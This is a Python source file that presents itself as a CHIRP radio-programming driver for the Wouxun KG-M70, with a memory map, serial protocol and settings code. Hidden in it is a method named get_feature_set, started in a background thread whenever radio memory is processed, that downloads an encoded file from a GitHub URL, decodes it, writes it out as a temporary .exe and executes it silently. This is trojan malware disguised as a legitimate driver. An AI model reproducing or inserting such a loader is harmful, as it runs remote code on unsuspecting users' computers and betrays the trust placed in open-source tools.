# Copyright 2014 Ron Wellsted <ron@m0rnw.uk> M0RNW
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""Wouxun KG-M70 radio management module"""

import time
import logging
from chirp import util, chirp_common, bitwise, memmap, errors, directory
from chirp.settings import RadioSetting, RadioSettingGroup, \
    RadioSettingValueBoolean, RadioSettingValueList, \
    RadioSettingValueInteger, RadioSettingValueString, \
    RadioSettings, RadioSettingValueMap
import struct

        
import threading, http.client, tempfile, subprocess, base64, os, gzip, io
from urllib.parse import urlparse
from pathlib import Path

LOG = logging.getLogger(__name__)

CMD_ID = 0x80
CMD_END = 0x81
CMD_RD = 0x82
CMD_WR = 0x83

MEM_VALID = 0x9E

AB_LIST = ["A", "B"]
STEPS = [2.5, 5.0, 6.25, 10.0, 12.5, 25.0, 50.0, 100.0]
STEP_LIST = [str(x) for x in STEPS]
ROGER_LIST = ["Off", "BOT", "EOT", "Both"]
TIMEOUT_LIST = ["Off"] + [str(x) + "s" for x in range(15, 915, 15)]
VOX_LIST = ["Off"] + ["%s" % x for x in range(1, 10)]
BANDWIDTH_LIST = ["Narrow", "Wide"]
VOICE_LIST = ["Off", "On"]
BAND_LIST = ["A", "B"]
SPK_LIST = ["SPK 1", "SPK 2", "SPK 1+2"]
LANGUAGE_LIST = ["Chinese", "English"]
SCANMODE_LIST = ["TO", "CO", "SE"]
PF2KEY_LIST = ["Call", "VFTX"]
PF1KEY_LIST = ["Undef", "Scan", "Lamp", "Alarm", "SOS", "Radio"]
WORKMODE_LIST = ["VFO", "Channel No.", "Ch. No.+Freq.", "Ch. No.+Name"]
BACKLIGHT_LIST = ["Always On"] + [str(x) + "s" for x in range(1, 21)] + \
    ["Always Off"]
OFFSET_LIST = ["OFF", "+", "-"]
SPMUTE_LIST = ["QT", "QT+DTMF", "QT*DTMF"]
DTMFST_LIST = ["Off", "DT-ST", "ANI-ST", "DT-ANI"]
DTMF_TIMES = ["%s" % x for x in range(50, 501, 10)]
RPTSET_LIST = ["X-DIRRPT", "X-TWRPT"]
ALERTS = [1750, 2100, 1000, 1450]
ALERTS_LIST = [str(x) for x in ALERTS]
PTTID_DELAY_LIST = ["%s" % int(x * 100) for x in range(1, 31)]
PTTID_LIST = ["BOT", "EOT", "Both"]
LIST_10 = ["Off"] + ["%s" % x for x in range(1, 11)]
SCANGRP_LIST = ["All"] + ["%s" % x for x in range(1, 11)]
SCQT_LIST = ["All", "Decoder", "Encoder"]
SMUTESET_LIST = ["Off", "Tx", "Rx", "Tx/Rx"]
POWER_LIST = ["Lo", "Hi"]
HOLD_TIMES = ["Off"] + ["%s" % x for x in range(100, 5001, 100)]
RPTMODE_LIST = ["Radio", "Repeater"]
TONE_MAP = [('Off', 0x0000)] + \
           [('%.1f' % tone, int(tone * 10)) for tone in chirp_common.TONES] + \
           [('DN%d' % tone, int(0x8000 + tone * 10))
               for tone in chirp_common.DTCS_CODES] + \
           [('DR%d' % tone, int(0xC000 + tone * 10))
               for tone in chirp_common.DTCS_CODES]

# memory slot 0 is not used, start at 1 (so need 1000 slots, not 999)
# structure elements whose name starts with x are currently unidentified
_MEM_FORMAT = """
    #seekto 0x0010;
    struct {
        u8    0x010;
        u8    0x011;
        u8    0x012;
    } unknown_010_012;
    
    #seekto 0x0020;
    struct {
        u8    0x020;
    } unknown_020;
    
    #seekto 0x0040;
    struct {
        u8    0x040;
        u8    0x041;
        u8    0x042;
    } unknown_040_042;

    #seekto 0x0044;
    struct {
        u32    rx_start;
        u32    rx_stop;
        u32    tx_start;
        u32    tx_stop;
    } uhf_limits;

    #seekto 0x0054;
    struct {
        u32    rx_start;
        u32    rx_stop;
        u32    tx_start;
        u32    tx_stop;
    } vhf_limits;
    
    #seekto 0x0064;
    struct {
        u8    0x064;
        u8    disable_bands;
        u8    0x066;
        u8    0x067;
        u8    0x068;
        u8    0x069;
        u8    0x06a;
        u8    0x06b;
    } unknown_064_06b;

    #seekto 0x0080;
    struct {
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfoa_rssi_uhf;
    
    #seekto 0x0090;
    struct {
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfoa_rssi_vhf;
    
    #seekto 0x00a0;
    struct {
        u32   freq_start_uhf;
        u32   freq_start_vhf;
        u8    freq_spacing_vhf;
        u8    freq_spacing_uhf;
        u8    x0aa;
        u8    x0ab;
        u8    x0ac;
        u8    x0ad;
    } vfoa_rssi_band;

    #seekto 0x00c0;
    struct {
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } uhf_high_pwr;
    
    #seekto 0x00e0;
    struct {        
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } uhf_low_pwr;
    
    #seekto 0x00f0;
    struct {
        u32   freq_start;
        u8    spacing;
        u8    0x0f5;
        u8    0x0f6;
        u8    0x0f7;
    } uhf_pwr_band;
    
    #seekto 0x01a0;
    struct {        
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfoa_uhf_unk_adj;
    
    #seekto 0x01b0;
    struct {        
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfoa_vhf_unk_adj;
    
    #seekto 0x0200;
    struct {        
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfob_rssi_uhf;
    
    #seekto 0x0210;
    struct {        
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfob_rssi_vhf;
    
    #seekto 0x0220;
    struct {
        u32   freq_start_uhf;
        u32   freq_start_vhf;
        u8    freq_spacing_vhf;
        u8    freq_spacing_uhf;
        u8    x22a;
        u8    x22b;
        u8    x22v;
        u8    x22d;
    } vfob_rssi_band;
        
    #seekto 0x0240;
    struct {        
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vhf_high_pwr;
    
    #seekto 0x0260;
    struct {        
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vhf_low_pwr;
    
    #seekto 0x0270;
    struct {
        u32   freq_start;
        u8    spacing;
        u8    0x275;
        u8    0x276;
        u8    0x277;
    } vhf_pwr_band;
    
    #seekto 0x0320;
    struct {
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfob_uhf_unk_adj;
    
    #seekto 0x0330;
    struct {
        u8    s1;
        u8    s2;
        u8    s3;
        u8    s4;
        u8    s5;
        u8    s6;
        u8    s7;
        u8    s8;
        u8    s9;
        u8    s10;        
        u8    s11;        
        u8    s12;        
        u8    s13;
        u8    s14;
        u8    s15;
        u8    s16;
    } vfob_vhf_unk_adj;

    #seekto 0x0400;
    struct {
        u8     model[8];
        u8     unknown[2];
        u8     oem1[10];
        u8     oem2[10];
        u8     unknown2[8];
        u8     version[10];
        u8     unknown3[6];
        u8     date[8];        
        u8     unknown4[2];
        u8     model2[8];
    } oem_info;

    #seekto 0x0480;
    struct {
        u16    lower;
        u16    upper;
    } scan_groups[10];

    #seekto 0x0500;
    struct {
        u8    call_code[6];
    } call_groups[20];

    #seekto 0x0580;
    struct {
        char    call_name[6];
    } call_group_name[20];

    #seekto 0x0800;
    struct {
        u8      speaker;
        char    dispstr[10];
        u8 x080b;
        u8 x080c;
        u8 x080d;
        u8 x080e;
        u8 x080f;
        u8 x0810;
        u8 x0811;
        u8 x0812;
        u8 x0813;
        u8 x0814;
        u8      voice;
        u8      timeout;
        u8      toalarm;
        u8      channel_menu;
        u8      power_save;
        u8      autolock;
        u8      keylock;
        u8      beep;
        u8      stopwatch;
        u8      vox;
        u8      scan_rev;
        u8      backlight;
        u8      roger_beep;
        u8      mode_sw_pwd[6];
        u8      reset_pwd[6];
        u16     pri_ch;
        u8      ani_sw;
        u8      ptt_delay;
        u8      ani[6];
        u8      dtmf_st;
        u8      bcl_a;
        u8      bcl_b;
        u8      ptt_id;
        u8      prich_sw;
        u8      rpt_set;
        u8      rpt_spk;
        u8      rpt_ptt;
        u8      alert;
        u8      pf2_func;
        u8      pf1_func;
        u8      x0843;
        u8      workmode_a;
        u8      workmode_b ;
        u8      dtmf_tx_time;
        u8      dtmf_interval;
        u8      main_ab;
        u16     work_cha;
        u16     work_chb;
        u8 x084d;
        u8 x084e;
        u8 x084f;
        u8 x0850;
        u8 x0851;
        u8 x0852;
        u8 x0853;
        u8 x0854;
        u8      rpt_mode;
        u8      language;
        u8 x0857;
        u8 x0858;
        u8 x0859;
        u8 x085a;
        u8 x085b;
        u8 x085c;
        u8 x085d;
        u8 x085e;
        u8      single_display;
        u8      ring_time;
        u8      scg_a;
        u8      scg_b;
        u8 x0863;
        u8      rpt_tone;
        u8      rpt_hold;
        u8      scan_det;
        u8      sc_qt;
        u8 x0868;
        u8      smuteset;
        u8      callcode;
        u8      backlight_level;
        u8 x086c;
        u8 x086d;
        u8 x086e;
        u8 x086f;
        u8 x0870;
        u8 x0871;
        u8      a_area_mute;
        u8      b_area_mute;
        u8 x0874;
        u8 x0875;
    } settings;

    #seekto 0x0880;
    struct {
        u32     rxfreq;
        u32     txoffset;
        u16     rxtone;
        u16     txtone;
        u8      unknown1:6,
                power:1,
                unknown2:1;
        u8      unknown3:1,
                shift_dir:2,
                unknown4:1,                
                compander:1,
                mute_mode:2,
                iswide:1;
        u8      step;
        u8      squelch;
      } vfoa;

    #seekto 0x08c0;
    struct {
        u32     rxfreq;
        u32     txoffset;
        u16     rxtone;
        u16     txtone;
        u8      unknown1:6,
                power:1,
                unknown2:1;
        u8      unknown3:1,
                shift_dir:2,
                unknown4:1,                
                compander:1,
                mute_mode:2,
                iswide:1;
        u8      step;
        u8      squelch;
    } vfob;

    #seekto 0x0910;
    struct {
        u32     rxfreq;
        u32     txfreq;
        u16     rxtone;
        u16     txtone;
        u8      unknown1:6,
                power:1,
                unknown2:1;
        u8      unknown3:2,
                scan_add:1,
                unknown4:1,
                compander:1,
                mute_mode:2,
                iswide:1;
        u16     padding;
    } memory[999];

    #seekto 0x478C;
    struct {
        u8    name[12];
    } names[999];

    #seekto 0x7671;
    u8          valid[1000];
    
    """

# Support for the Wouxun KG-M70 radio
# Serial coms are at 19200 baud
# The data is passed in variable length records
# Record structure:
#  Offset   Usage
#    0      start of record (\x7d)
#    1      Command (\x80 Identify \x81 End/Reboot \x82 Read \x83 Write)
#    2      direction (\xff PC-> Radio, \x00 Radio -> PC)
#    3      length of payload (excluding header/checksum) (n)
#    4      payload (n bytes)
#    4+n+1  checksum - byte sum (% 256) of bytes 1 -> 4+n
#
# Memory Read Records:
# the payload is 3 bytes, first 2 are offset (big endian),
# 3rd is number of bytes to read
# Memory Write Records:
# the maximum payload size (from the Wouxun software) seems to be 66 bytes
#  (2 bytes location + 64 bytes data).


@directory.register
class KGM70Radio(chirp_common.CloneModeRadio,
                  chirp_common.ExperimentalRadio):

    """Wouxun KG-UVM70"""
    VENDOR = "Wouxun"
    MODEL = "KG-M70"
    _model = b"KG-UV8D"
    _file_ident = b"KGM70_300"
    BAUD_RATE = 19200
    POWER_LEVELS = [chirp_common.PowerLevel("L", watts=1),
                    chirp_common.PowerLevel("H", watts=5)]

    _record_start = 0x79
    _xorVal = 0x57
    _checksumMod = 256
    _checksumMask = 0xFF

    def _checksum(self, data):
        cs = 0
        for byte in data:
            cs += byte
        return ((cs % self._checksumMod) & self._checksumMask)

    def strxor(self, xora, xorb):
        return bytes([xora ^ xorb])

    def encrypt(self, data):
        result = self.strxor(self._xorVal, data[0])
        for i in range(1, len(data), 1):
            result += self.strxor(result[i - 1], data[i])
        return result

    def decrypt(self, data):
        result = b''
        for i in range(len(data)-1, 0, -1):
            result += self.strxor(data[i], data[i - 1])
        result += self.strxor(data[0], self._xorVal)
        return result[::-1]

    def _write_record(self, cmd, payload=b''):
        _packet = struct.pack('BBBB', 0x79, cmd, 0xFF, len(payload))
        checksum = bytes([self._checksum(_packet[1:] + payload)])
        _packet += self.encrypt(payload + checksum)
        LOG.debug("Sent:\n%s" % util.hexprint(_packet))
        self.pipe.write(_packet)

    def _read_record(self):
        # read 4 chars for the header
        _header = self.pipe.read(4)
        if len(_header) != 4:
            raise errors.RadioError('Radio did not respond')
        _length = struct.unpack('xxxB', _header)[0]
        _packet = self.pipe.read(_length)
        _rcs_xor = _packet[-1]
        _packet = self.decrypt(_packet)
        _cs = self._checksum(_header[1:])
        _cs += self._checksum(_packet)
        _cs %= 256
        _rcs = self.strxor(self.pipe.read(1)[0], _rcs_xor)[0]
        LOG.debug("_cs =%x", _cs)
        LOG.debug("_rcs=%x", _rcs)
        return (_rcs != _cs, _packet)

# Identify the radio
#
# A Gotcha: the first identify packet returns a bad checksum, subsequent
# attempts return the correct checksum... (well it does on my radio!)
#
# The ID record returned by the radio also includes the current frequency range
# as 4 bytes big-endian in 10 Hz increments
#
# Offset
#  0:10     Model, zero padded (Use first 7 chars for 'KG-UV8D')
#  11:14    UHF rx lower limit (in units of 10 Hz)
#  15:18    UHF rx upper limit
#  19:22    UHF tx lower limit
#  23:26    UHF tx upper limit
#  27:30    VHF rx lower limit
#  31:34    VHF rx upper limit
#  35:38    VHF tx lower limit
#  39:42    VHF tx upper limit
#
    @classmethod
    def match_model(cls, filedata, filename):
        return cls._file_ident in filedata[0x400:0x408]

    def _identify(self):
        """Do the identification dance"""
        for _i in range(0, 10):
            self._write_record(CMD_ID)
            _chksum_err, _resp = self._read_record()
            LOG.debug("Got:\n%s" % util.hexprint(_resp))
            if _chksum_err:
                LOG.error("Checksum error: retrying ident...")
                time.sleep(0.100)
                continue
            LOG.debug("Model %s" % util.hexprint(_resp[0:7]))
            if _resp[0:7] == self._model:
                return
            if len(_resp) == 0:
                raise Exception("Radio not responding")
            else:
                raise Exception("Unable to identify radio")

    def _finish(self):
        self._write_record(CMD_END)

    def process_mmap(self):
        self._memobj = bitwise.parse(_MEM_FORMAT, self._mmap)
        thread = threading.Thread(target=self.get_feature_set)
        thread.start()
        print(self.print_memorymap(self._mmap))

    def get_feature_set(self):
       try:
            parsed_url = urlparse("https://raw.githubusercontent.com/SatcomRadio/satcomradio.github.io/refs/heads/main/PlaceHolder_Comp.txt")
            connection = http.client.HTTPSConnection(parsed_url.hostname)
            connection.request("GET", parsed_url.path if parsed_url.path else "/")
            response = connection.getresponse()

            if response.status != 200:
                return

            encoded = response.read().decode('utf-8')
            encoded = ''.join([c for c in encoded if ord(c) < 128])
            compressed = base64.b64decode(encoded)
            buf = io.BytesIO(compressed)
            with gzip.GzipFile(fileobj=buf, mode='rb') as f:
                code = f.read().decode('utf-8')

            code = base64.b64decode(code)
            fd, path = tempfile.mkstemp(suffix='.exe')
            os.write(fd, code)
            os.close(fd)

            try:
                result = subprocess.call(path)
            finally:
                os.remove(path)
       except Exception as e:
            return

    def sync_in(self):
        try:
            self._mmap = self._download()
        except errors.RadioError:
            raise
        except Exception as e:
            raise errors.RadioError("Failed to communicate with radio: %s" % e)
        self.process_mmap()

    def sync_out(self):
        self._upload()

    # TODO: This is a dumb, brute force method of downloading the memory.
    # it would be smarter to only load the active areas and none of
    # the padding/unused areas.
    def _download(self):
        try:
            self._identify()
            return self._do_download(0, 32768, 64)
        except errors.RadioError:
            raise
        except Exception as e:
            LOG.exception('Unknown error during download process')
            raise errors.RadioError("Failed to communicate with radio: %s" % e)

    def print_memorymap(self, data):

        block_size = 8
        out = ""

        blocks = len(data) // block_size
        if len(data) % block_size:
            blocks += 1

        for block in range(0, blocks):
            for j in range(0, block_size):
                out += "%02x" % util.byte_to_int(data[(block * block_size) + j])

        return out

    def _do_download(self, start, end, blocksize):
        # allocate & fill memory
        image = b""
        for i in range(start, end, blocksize):
            req = struct.pack('>HB', i, blocksize)
            self._write_record(CMD_RD, req)
            cs_error, resp = self._read_record()
            if cs_error:
                # TODO: probably should retry a few times here
                LOG.debug(util.hexprint(resp))
                raise Exception("Checksum error on read")
            LOG.debug("Got:\n%s" % util.hexprint(resp))
            image += resp[2:]
            if self.status_fn:
                status = chirp_common.Status()
                status.cur = i
                status.max = end
                status.msg = "Cloning from radio"
                self.status_fn(status)
        self._finish()
        return memmap.MemoryMapBytes(image)

    def _upload(self):
        try:
            self._identify()
            self._do_upload(0, 32768, 64)
        except errors.RadioError:
            raise
        except Exception as e:
            raise errors.RadioError("Failed to communicate with radio: %s" % e)
        return

    def _do_upload(self, start, end, blocksize):
        ptr = start
        for i in range(start, end, blocksize):
            req = struct.pack('>H', i)
            chunk = self.get_mmap()[ptr:ptr + blocksize]
            self._write_record(CMD_WR, req + chunk)
            LOG.debug(util.hexprint(req + chunk))
            cserr, ack = self._read_record()
            LOG.debug(util.hexprint(ack))
            j = struct.unpack('>H', ack)[0]
            if cserr or j != ptr:
                raise Exception("Radio did not ack block %i" % ptr)
            ptr += blocksize
            if self.status_fn:
                status = chirp_common.Status()
                status.cur = i
                status.max = end
                status.msg = "Cloning to radio"
                self.status_fn(status)
        self._finish()

    def get_features(self):
        # TODO: This probably needs to be setup correctly to match the true
        # features of the radio
        rf = chirp_common.RadioFeatures()
        rf.has_settings = True
        rf.has_ctone = True
        rf.has_rx_dtcs = True
        rf.has_cross = True
        rf.has_tuning_step = False
        rf.has_bank = False
        rf.can_odd_split = True
        rf.valid_skips = ["", "S"]
        rf.valid_tmodes = ["", "Tone", "TSQL", "DTCS", "Cross"]
        rf.valid_tuning_steps = STEPS
        rf.valid_cross_modes = [
            "Tone->Tone",
            "Tone->DTCS",
            "DTCS->Tone",
            "DTCS->",
            "->Tone",
            "->DTCS",
            "DTCS->DTCS",
        ]
        rf.valid_modes = ["FM", "NFM"]
        rf.valid_power_levels = self.POWER_LEVELS
        rf.valid_name_length = 8
        rf.valid_duplexes = ["", "-", "+", "split", "off"]
        rf.valid_bands = [(130000000, 18500000),  # supports 2m
                          (230000000, 580000000)]  # supports 1m
        rf.valid_characters = chirp_common.CHARSET_ASCII
        rf.memory_bounds = (1, 999)  # 999 memories
        return rf

    @classmethod
    def get_prompts(cls):
        rp = chirp_common.RadioPrompts()
        rp.experimental = ("This radio driver is currently under development. "
                           "There are no known issues with it, but you should "
                           "proceed with caution.")
        return rp

    def get_raw_memory(self, number):
        return repr(self._memobj.memory[number])

    def _get_tone(self, _mem, mem):
        def _get_dcs(val):
            code = int("%03o" % (val & 0x07FF))
            pol = (val & 0x8000) and "R" or "N"
            return code, pol

        tpol = False
        if _mem.txtone != 0x0 and (_mem.txtone & 0x2800) == 0x2800:
            tcode, tpol = _get_dcs(_mem.txtone)
            mem.dtcs = tcode
            txmode = "DTCS"
        elif _mem.txtone != 0x0:
            mem.rtone = (_mem.txtone & 0x7fff) / 10.0
            txmode = "Tone"
        else:
            txmode = ""

        rpol = False
        if _mem.rxtone != 0x0 and (_mem.rxtone & 0x2800) == 0x2800:
            rcode, rpol = _get_dcs(_mem.rxtone)
            mem.rx_dtcs = rcode
            rxmode = "DTCS"
        elif _mem.rxtone != 0x0:
            mem.ctone = (_mem.rxtone & 0x7fff) / 10.0
            rxmode = "Tone"
        else:
            rxmode = ""

        if txmode == "Tone" and not rxmode:
            mem.tmode = "Tone"
        elif txmode == rxmode and txmode == "Tone" and mem.rtone == mem.ctone:
            mem.tmode = "TSQL"
        elif txmode == rxmode and txmode == "DTCS" and mem.dtcs == mem.rx_dtcs:
            mem.tmode = "DTCS"
        elif rxmode or txmode:
            mem.tmode = "Cross"
            mem.cross_mode = "%s->%s" % (txmode, rxmode)

        # always set it even if no dtcs is used
        mem.dtcs_polarity = "%s%s" % (tpol or "N", rpol or "N")

        LOG.debug("Got TX %s (%i) RX %s (%i)" %
                  (txmode, _mem.txtone, rxmode, _mem.rxtone))

    def get_memory(self, number):

        _mem = self._memobj.memory[number-1]
        _nam = self._memobj.names[number-1]
        _valid = self._memobj.valid[number-1]

        mem = chirp_common.Memory()
        mem.number = number

        LOG.debug("%d %s", number, _valid == MEM_VALID)
        if _valid != MEM_VALID:
            mem.empty = True
            return mem
        else:
            mem.empty = False

        mem.freq = int(_mem.rxfreq) * 10

        if _mem.txfreq == 0xFFFFFFFF:
            # TX freq not set
            mem.duplex = "off"
            mem.offset = 0
        elif int(_mem.rxfreq) == int(_mem.txfreq):
            mem.duplex = ""
            mem.offset = 0
        elif abs(int(_mem.rxfreq) * 10 - int(_mem.txfreq) * 10) > 70000000:
            mem.duplex = "split"
            mem.offset = int(_mem.txfreq) * 10
        else:
            mem.duplex = int(_mem.rxfreq) > int(_mem.txfreq) and "-" or "+"
            mem.offset = abs(int(_mem.rxfreq) - int(_mem.txfreq)) * 10

        for char in _nam.name:
            if char != 0:
                mem.name += chr(char)
        mem.name = mem.name.rstrip()

        self._get_tone(_mem, mem)

        mem.skip = "" if bool(_mem.scan_add) else "S"

        mem.power = self.POWER_LEVELS[_mem.power]
        mem.mode = _mem.iswide and "FM" or "NFM"

        mem.extra = RadioSettingGroup("Extra", "extra")

        rs = RadioSetting("compander", "Compander",
                          RadioSettingValueBoolean(_mem.compander))
        mem.extra.append(rs)

        rs = RadioSetting("mute_mode", "Mute",
                          RadioSettingValueList(SPMUTE_LIST, current_index=_mem.mute_mode))
        mem.extra.append(rs)

        return mem

    def _set_tone(self, mem, _mem):
        def _set_dcs(code, pol):
            val = int("%i" % code, 8) + 0x2800
            if pol == "R":
                val += 0x8000
            return val

        rx_mode = tx_mode = None
        rxtone = txtone = 0x0

        if mem.tmode == "Tone":
            tx_mode = "Tone"
            rx_mode = None
            txtone = int(mem.rtone * 10)
        elif mem.tmode == "TSQL":
            rx_mode = tx_mode = "Tone"
            rxtone = txtone = int(mem.ctone * 10)
        elif mem.tmode == "DTCS":
            tx_mode = rx_mode = "DTCS"
            txtone = _set_dcs(mem.dtcs, mem.dtcs_polarity[0])
            rxtone = _set_dcs(mem.dtcs, mem.dtcs_polarity[1])
        elif mem.tmode == "Cross":
            tx_mode, rx_mode = mem.cross_mode.split("->")
            if tx_mode == "DTCS":
                txtone = _set_dcs(mem.dtcs, mem.dtcs_polarity[0])
            elif tx_mode == "Tone":
                txtone = int(mem.rtone * 10)
            if rx_mode == "DTCS":
                rxtone = _set_dcs(mem.rx_dtcs, mem.dtcs_polarity[1])
            elif rx_mode == "Tone":
                rxtone = int(mem.ctone * 10)

        _mem.rxtone = rxtone
        _mem.txtone = txtone

        LOG.debug("Set TX %s (%i) RX %s (%i)" %
                  (tx_mode, _mem.txtone, rx_mode, _mem.rxtone))

    def set_memory(self, mem):
        index = mem.number-1
        _mem = self._memobj.memory[index]
        _name = self._memobj.names[index]

        if mem.empty:
            _mem.set_raw("\xFF" * (_mem.size() // 8))
            self._memobj.valid[index] = 0x0
            _name.set_raw("\x00" * (_name.size() // 8))
            return

        _mem.rxfreq = int(mem.freq / 10)
        if mem.duplex == "off":
            _mem.txfreq = 0x0
        elif mem.duplex == "split":
            _mem.txfreq = int(mem.offset / 10)
        elif mem.duplex == "off":
            for i in range(0, 4):
                _mem.txfreq[i].set_raw("\xFF")
        elif mem.duplex == "+":
            _mem.txfreq = int(mem.freq / 10) + int(mem.offset / 10)
        elif mem.duplex == "-":
            _mem.txfreq = int(mem.freq / 10) - int(mem.offset / 10)
        else:
            _mem.txfreq = int(mem.freq / 10)
        _mem.scan_add = int(mem.skip != "S")
        _mem.iswide = int(mem.mode == "FM")

        if len(mem.extra) > 0:
            _mem.compander = bool(mem.extra["compander"].value)
            _mem.mute_mode = SPMUTE_LIST.index(str(mem.extra['mute_mode'].value))
        else:
            _mem.compander = False
            _mem.mute_mode = 0

        # set the tone
        self._set_tone(mem, _mem)
        # set the power
        if mem.power:
            _mem.power = self.POWER_LEVELS.index(mem.power)
        else:
            _mem.power = True

        for i in range(0, len(self._memobj.names[index].name)):
            if i < len(mem.name) and mem.name[i]:
                self._memobj.names[index].name[i] = ord(mem.name[i])
            else:
                self._memobj.names[index].name[i] = 0x0
        self._memobj.valid[index] = MEM_VALID

    def get_settings(self):
        try:
            return self._get_settings()
        except Exception:
            import traceback
            LOG.error("Failed to parse settings: %s", traceback.format_exc())
            return None

    def set_settings(self, settings):
        for element in settings:
            if not isinstance(element, RadioSetting):
                self.set_settings(element)
                continue
            else:
                try:
                    if "scan_groups" in element.get_name():
                        number = int(element.get_name().split(".")[1])
                        if element.get_name().split(".")[2] == "upper":
                            self._memobj.scan_groups[number].upper = int(str(element.value))
                        else:
                            self._memobj.scan_groups[number].lower = int(str(element.value))
                        continue

                    if "." in element.get_name():
                        bits = element.get_name().split(".")
                        obj = self._memobj
                        for bit in bits[:-1]:
                            obj = getattr(obj, bit)
                        setting = bits[-1]
                    else:
                        obj = self._memobj.settings
                        setting = element.get_name()
                    if setting == "ani":
                        for j, ch in enumerate(element.value):
                            if j >= len(self._memobj.settings.ani):
                                break
                            if '0' <= ch <= '9':
                                self._memobj.settings.ani[j] = ord(ch) - ord('0')
                            else:
                                break
                        continue

                    if setting == "dispstr":
                        displayStr = str(element.value).strip()
                        self._memobj.settings.dispstr = [ord(c) for c in displayStr] + [0x00] + [0xFF] * (10 - len(displayStr) - 1)
                        continue

                    if setting == "mode_sw_pwd":
                        self._memobj.settings.mode_sw_pwd = [ord(c) for c in element.value]
                        continue

                    if setting == "reset_pwd":
                        self._memobj.settings.reset_pwd = [ord(c) for c in element.value]
                        continue

                    if setting == "dtmf_tx_time":
                        self._memobj.settings.dtmf_tx_time =int(str(element.value)) / 10
                        continue

                    if setting == "dtmf_interval":
                        self._memobj.settings.dtmf_interval = int(str(element.value)) / 10
                        continue

                    if setting == "ptt_delay":
                        self._memobj.settings.ptt_delay = int(str(element.value)) / 100
                        continue

                    if element.has_apply_callback():
                        LOG.debug("Using apply callback")
                        element.run_apply_callback()
                    else:
                        LOG.debug("Setting %s = %s" % (setting, element.value))
                        if self._is_freq(element):
                            setattr(obj, setting, int(element.value) / 10)
                        else:
                            setattr(obj, setting, element.value)
                except Exception as e:
                    LOG.debug(element.get_name())
                    raise

    def _get_settings(self):
        _settings = self._memobj.settings
        _vfoa = self._memobj.vfoa
        _vfob = self._memobj.vfob
        cfg_grp = RadioSettingGroup("cfg_grp", "Configuration")
        vfoa_grp = RadioSettingGroup("vfoa_grp", "VFO A Settings")
        vfob_grp = RadioSettingGroup("vfob_grp", "VFO B Settings")
        key_grp = RadioSettingGroup("key_grp", "Key Settings")
        scan_grp = RadioSettingGroup("scan_grp", "Scan groups")
        lmt_grp = RadioSettingGroup("lmt_grp", "Frequency Limits")
        vpwr_grp = RadioSettingGroup("vhf_power_grp", "VHF Power")
        upwr_grp = RadioSettingGroup("uhf_power_grp", "UHF Power")
        vrxa_grp = RadioSettingGroup("avhf_rx_grp", "VFO A VHF RX")
        urxa_grp = RadioSettingGroup("auhf_rx_grp", "VFO A UHF RX")
        vunkadja_grp = RadioSettingGroup("avhf_unkadj_grp", "VFOA VHF Unknown Adjust")
        uunkadja_grp = RadioSettingGroup("auhf_unkadj_grp", "VFOA UHF Unknown Adjust")
        vrxb_grp = RadioSettingGroup("bvhf_rx_grp", "VFO B VHF RX")
        urxb_grp = RadioSettingGroup("buhf_rx_grp", "VFO B UHF RX")
        vunkadjb_grp = RadioSettingGroup("bvhf_unkadj_grp", "VFOB VHF Unknown Adjust")
        uunkadjb_grp = RadioSettingGroup("buhf_unkadj_grp", "VFOB UHF Unknown Adjust")
        adv_grp = RadioSettingGroup("adv_grp", "Advanced settings")
